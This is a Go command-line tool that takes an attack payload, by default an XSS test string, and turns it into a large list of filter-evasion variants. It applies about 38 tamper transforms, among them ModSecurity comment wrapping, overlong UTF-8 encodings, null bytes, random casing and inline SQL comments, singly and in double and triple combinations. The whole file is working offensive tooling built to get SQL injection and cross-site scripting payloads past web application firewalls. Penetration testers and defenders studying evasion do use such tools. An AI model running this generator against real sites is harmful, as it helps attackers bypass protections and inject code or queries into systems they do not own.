package main

import (
	"encoding/base64"
	"encoding/hex"
	"flag"
	"fmt"
	"math/rand"
	"net/url"
	"strconv"
	"strings"
	"time"
	"unicode"
)

var payload string

func init() {
	flag.StringVar(&payload, "p", "<script> alert(1) </script>", "Payload to encode")
}

func apostrephemask(payload string) string {
	aux := payload
	aux = strings.Replace(aux, "'", "%EF%BC%87", -1)
	return aux
}

func apostrephenullify(payload string) string {
	aux := payload
	aux = strings.Replace(aux, "'", "%00%27", -1)
	return aux
}

func appendnull(payload string) string {
	return payload + "%00"
}

func base64encode(payload string) string {
	aux := payload
	aux = base64.URLEncoding.EncodeToString([]byte(aux))
	return aux
}

func booleanmask(payload string) string {
	aux := payload
	r := strings.NewReplacer("or", "%7C%7C", "OR", "%7C%7C", "AND", "%26%26", "and", "%26%26")
	aux = r.Replace(aux)
	return aux
}

func doubleurlencode(payload string) string {
	aux := payload
	aux = url.QueryEscape(aux)
	aux = url.QueryEscape(aux)
	r := strings.NewReplacer("_", "%5F", ".", "%2E")
	aux = r.Replace(aux)
	return aux
}

func enclosebrackets(payload string) string {
	aux := payload
	slice := []byte("")
	tmp := []byte("[]")
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(aux); i++ {
		if string(aux[i]) == "0" || string(aux[i]) == "1" || string(aux[i]) == "2" || string(aux[i]) == "3" || string(aux[i]) == "4" || string(aux[i]) == "5" || string(aux[i]) == "6" || string(aux[i]) == "7" || string(aux[i]) == "8" || string(aux[i]) == "9" {
			slice = append(slice, tmp[0], aux[i], tmp[1])
		} else {
			slice = append(slice, aux[i])
		}
	}
	return string(slice)
}

func escapequotes(payload string) string {
	aux := payload
	r := strings.NewReplacer("'", "\\'", "\"", "\\\"")
	aux = r.Replace(aux)
	return aux
}

func lowercase(payload string) string {
	aux := payload
	aux = strings.ToLower(aux)
	return aux
}

func lowlevelunicodecharacter(payload string) string {
	aux := payload
	r := strings.NewReplacer("1", "\u00B9", "2", "\u00B2", "3", "\u00B3", "D", "\u00D0",
		"T", "\u00DE", "Y", "\u00DD", "a", "\u00AA", "e", "\u00F0",
		"o", "\u00BA", "t", "\u00FE", "y", "\u00FD", "|", "\u00A6",
		"d", "\u00D0", "A", "\u00AA", "E", "\u00F0", "O", "\u00BA")
	aux = r.Replace(aux)
	return aux
}

func maskenclosebrackets(payload string) string {
	aux := payload
	slice := []byte("")
	tmp := []byte("[]")
	apho := []byte("%EF%BC%87")
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(aux); i++ {
		if string(aux[i]) == "0" || string(aux[i]) == "1" || string(aux[i]) == "2" || string(aux[i]) == "3" || string(aux[i]) == "4" || string(aux[i]) == "5" || string(aux[i]) == "6" || string(aux[i]) == "7" || string(aux[i]) == "8" || string(aux[i]) == "9" {
			slice = append(slice, tmp[0])
			for j := 0; j < len(apho); j++ {
				slice = append(slice, apho[j])
			}
			slice = append(slice, aux[i])
			for j := 0; j < len(apho); j++ {
				slice = append(slice, apho[j])
			}
			slice = append(slice, tmp[1])
		} else {
			slice = append(slice, aux[i])
		}
	}
	return string(slice)
}

func modsec(payload string) string {
	aux := payload
	return "/*!00000" + aux + "*/"
}

func modsecspace2comment(payload string) string {
	aux := payload
	aux = strings.Replace(aux, " ", "/**/", -1)
	return "/*!00000" + aux + "*/"
}

func obfuscatebyhtml(payload string) string {
	aux := payload
	r := strings.NewReplacer(" ", "&nbsp;", "<", "&lt;", ">", "&gt;", "&", "&amp;", "\"", "&quot;", "'", "&apos;")
	aux = r.Replace(aux)
	return aux
}

func obfuscatebyordinal(payload string) string { //Da fareeeeeeeeeeee
	aux := payload
	slice := []byte("")
	percent := []byte("%")
	for i := 0; i < len(aux); i++ {
		if string(aux[i]) == "%" || string(aux[i]) == "&" || string(aux[i]) == "<" || string(aux[i]) == ">" || string(aux[i]) == "/" || string(aux[i]) == "\\" || string(aux[i]) == ";" || string(aux[i]) == "'" || string(aux[i]) == "\"" {
			dst := (int(aux[i]) * 10) / 7
			tmp2 := byte(dst)
			sl := []byte("")
			sl = append(sl, tmp2)
			encHex := hex.EncodeToString(sl)
			slice = append(slice, percent[0])
			for j := 0; j < len(encHex); j++ {
				slice = append(slice, encHex[j])
			}

		} else {
			slice = append(slice, aux[i])
		}
	}
	return string(slice)
}

func prependnull(payload string) string {
	return "%00" + payload
}

func randomcase(payload string) string {
	aux := payload
	slice := []byte(aux)
	tmp2 := ""
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(slice); i++ {
		if rand.Intn(2) == 1 {
			tmp2 = strings.ToUpper(string(aux[i]))
		} else {
			tmp2 = strings.ToLower(string(aux[i]))
		}
		tmp := []byte(tmp2)
		slice[i] = tmp[0]
	}
	return string(slice)
}

func randomcomments(payload string) string {
	aux := payload
	slice := []byte("")
	tmp := []byte("/**/")
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(aux); i++ {
		if unicode.IsLetter(rune(aux[i])) {
			if rand.Intn(3) == 1 {
				slice = append(slice, tmp[0], tmp[1], tmp[2], tmp[3])
			}
		}
		slice = append(slice, aux[i])
	}
	return string(slice)
}

func randomtabify(payload string) string {
	aux := payload
	slice := []byte("")
	tmp := []byte(" ")
	tmp2 := []byte("\t")
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(aux); i++ {
		if string(aux[i]) == " " {
			if rand.Intn(2) == 1 {
				slice = append(slice, tmp[0], tmp[0], tmp[0], tmp[0], tmp[0], tmp[0], tmp[0], tmp[0])
			} else {
				slice = append(slice, tmp2[0])
			}
		} else {
			slice = append(slice, aux[i])
		}
	}
	return string(slice)
}

func randomunicode(payload string) string {
	aux := payload
	slice := []byte("")
	bytes := make([]byte, 2)
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(aux); i++ {
		randomN := rand.Intn(10)
		if randomN == 3 {
			for k := 0; k < 6; k++ {
				if _, err := rand.Read(bytes); err != nil {
				}
				hex4digit := hex.EncodeToString(bytes)
				s2, _ := strconv.Unquote(`"\u` + hex4digit + `"`)
				for j := 0; j < len(s2); j++ {
					slice = append(slice, s2[j])
				}
			}
		}
		slice = append(slice, aux[i])
	}
	return string(slice)
}

func space2comment(payload string) string {
	aux := payload
	aux = strings.Replace(aux, " ", "/**/", -1)
	return aux
}

func space2doubledashes(payload string) string {
	aux := payload
	aux = strings.Replace(aux, " ", "--", -1)
	return aux
}

func space2hash(payload string) string { //https://github.com/google/uuid
	aux := payload
	slice := []byte("")
	tmp := []byte("%%23")
	tmp2 := []byte("%%0A")
	bytes := make([]byte, 2)
	if _, err := rand.Read(bytes); err != nil {
		//return "", err
	}
	hex4digit := []byte(hex.EncodeToString(bytes))
	for i := 0; i < len(aux); i++ {
		if string(aux[i]) == " " {
			slice = append(slice, tmp[0], tmp[1], tmp[2], tmp[3])
			for j := 0; j < len(hex4digit); j++ {
				slice = append(slice, hex4digit[j])
			}
			slice = append(slice, tmp2[0], tmp2[1], tmp2[2], tmp2[3])
		} else {
			slice = append(slice, aux[i])
		}
	}
	return string(slice)
}

func space2multicomment(payload string) string {
	aux := payload
	slice := []byte("")
	tmp := []byte("/**/")
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(aux); i++ {
		if string(aux[i]) == " " {
			randomN := rand.Intn(3)
			slice = append(slice, tmp[0], tmp[1], tmp[2], tmp[3])
			if randomN == 2 {
				slice = append(slice, tmp[0], tmp[1], tmp[2], tmp[3], tmp[0], tmp[1], tmp[2], tmp[3])
			} else if randomN == 1 {
				slice = append(slice, tmp[0], tmp[1], tmp[2], tmp[3])
			}
		} else {
			slice = append(slice, aux[i])
		}
	}
	return string(slice)
}

func space2null(payload string) string {
	aux := payload
	aux = strings.Replace(aux, " ", "%00", -1)
	return aux
}

func space2plus(payload string) string {
	aux := payload
	aux = strings.Replace(aux, " ", "+", -1)
	return aux
}

func space2randomblank(payload string) string {
	aux := payload
	slice := []byte("")
	tmp := []byte("%0")
	tmp2 := []byte("9ACD0")
	rand.Seed(time.Now().UnixNano())
	for i := 0; i < len(aux); i++ {
		if string(aux[i]) == " " {
			slice = append(slice, tmp[0], tmp[1], tmp2[rand.Intn(5)])
		} else {
			slice = append(slice, aux[i])
		}
	}
	return string(slice)
}

func tabifyspacecommon(payload string) string {
	aux := payload
	aux = strings.Replace(aux, " ", "\t", -1)
	return aux
}

func tabifyspaceuncommon(payload string) string {
	aux := payload
	aux = strings.Replace(aux, " ", "        ", -1)
	return aux
}

func tripleurlencode(payload string) string {
	aux := payload
	aux = url.QueryEscape(aux)
	aux = url.QueryEscape(aux)
	aux = url.QueryEscape(aux)
	r := strings.NewReplacer("_", "%255F", ".", "%252E")
	aux = r.Replace(aux)
	return aux
}

func uppercase(payload string) string {
	aux := payload
	aux = strings.ToUpper(aux)
	return aux
}

func urlencode(payload string) string {
	aux := payload
	aux = url.QueryEscape(aux)
	return aux
}

func urlencodeall(payload string) string {
	aux := payload
	slice := []byte("")
	percent := []byte("%")
	for i := 0; i < len(aux); i++ {
		dst := int(aux[i])
		tmp2 := byte(dst)
		sl := []byte("")
		sl = append(sl, tmp2)
		encHex := hex.EncodeToString(sl)
		slice = append(slice, percent[0])
		for j := 0; j < len(encHex); j++ {
			slice = append(slice, encHex[j])
		}
	}
	return string(slice)
}

func htmlencodeall(payload string) string {
	aux := payload
	tmp := "&#x;"
	slice := []byte("")
	for i := 0; i < len(aux); i++ {
		dst := int(aux[i])
		tmp2 := byte(dst)
		sl := []byte("")
		sl = append(sl, tmp2)
		encHex := hex.EncodeToString(sl)
		slice = append(slice, tmp[0], tmp[1], tmp[2])
		for j := 0; j < len(encHex); j++ {
			slice = append(slice, encHex[j])
		}
		slice = append(slice, tmp[3])
	}
	return string(slice)
}

func space2slash(payload string) string {
	aux := payload
	aux = strings.Replace(aux, " ", "/", -1)
	return aux
}

func level1usingutf8(payload string) string {
	aux := payload
	r := strings.NewReplacer("<", "%C0%BC", ">", "%C0%BE", "'", "%C0%A7", "\"", "%C0%A2")
	aux = r.Replace(aux)
	return aux
}
func level2usingutf8(payload string) string {
	aux := payload
	r := strings.NewReplacer("<", "%E0%80%BC", ">", "%E0%80%BE", "'", "%E0%80%A7", "\"", "%E0%80%A2")
	aux = r.Replace(aux)
	return aux
}
func level3usingutf8(payload string) string {
	aux := payload
	r := strings.NewReplacer("<", "%F0%80%80%BC", ">", "%F0%80%80%BE", "'", "%F0%80%80%A7", "\"", "%F0%80%80%A2")
	aux = r.Replace(aux)
	return aux
}

func main() {
	flag.Parse()
	fmt.Println(payload)
	//insert encode functions in slice
	var fns []func(string) string
	fns = append(fns, apostrephemask)
	fns = append(fns, apostrephenullify)
	fns = append(fns, appendnull)
	fns = append(fns, base64encode)
	fns = append(fns, booleanmask)
	fns = append(fns, doubleurlencode)
	fns = append(fns, enclosebrackets)
	fns = append(fns, escapequotes)
	fns = append(fns, lowercase)
	fns = append(fns, lowlevelunicodecharacter) //toggle
	fns = append(fns, maskenclosebrackets)
	fns = append(fns, modsec)
	fns = append(fns, modsecspace2comment)
	fns = append(fns, obfuscatebyhtml)
	fns = append(fns, obfuscatebyordinal)
	fns = append(fns, prependnull)
	fns = append(fns, randomcase)
	fns = append(fns, randomcomments)
	fns = append(fns, randomtabify)
	fns = append(fns, randomunicode)	//toggle
	fns = append(fns, space2comment)
	fns = append(fns, space2doubledashes)
	fns = append(fns, space2hash)
	fns = append(fns, space2multicomment)
	fns = append(fns, space2null)
	fns = append(fns, space2plus)
	fns = append(fns, space2randomblank)
	fns = append(fns, tabifyspacecommon)
	fns = append(fns, tabifyspaceuncommon)
	fns = append(fns, tripleurlencode)
	fns = append(fns, uppercase)
	fns = append(fns, urlencode)
	fns = append(fns, urlencodeall)
	fns = append(fns, htmlencodeall)
	fns = append(fns, space2slash)
	fns = append(fns, level1usingutf8)
	fns = append(fns, level2usingutf8)
	fns = append(fns, level3usingutf8)

	//Generate payload encoded
	for i := 0; i < 3; i++ {
		if i == 0 { //single encode
			for _, fn := range fns {
				fmt.Println(fn(payload))
			}
		} else if i == 1 { //double encode
			for _, fn := range fns {
				aux := fn(payload)
				for _, fn2 := range fns {
					fmt.Println(fn2(aux))
				}
			}
		} else { //triple encode
			for _, fn := range fns {
				aux := fn(payload)
				for _, fn2 := range fns {
					aux2 := fn2(aux)
					for _, fn3 := range fns {
						fmt.Println(fn3(aux2))
					}
				}
			}
		}
	}
	//use awk to remove duplicates after generating the list --> awk '!seen[$0]++' list.txt > listFinal.txt
}
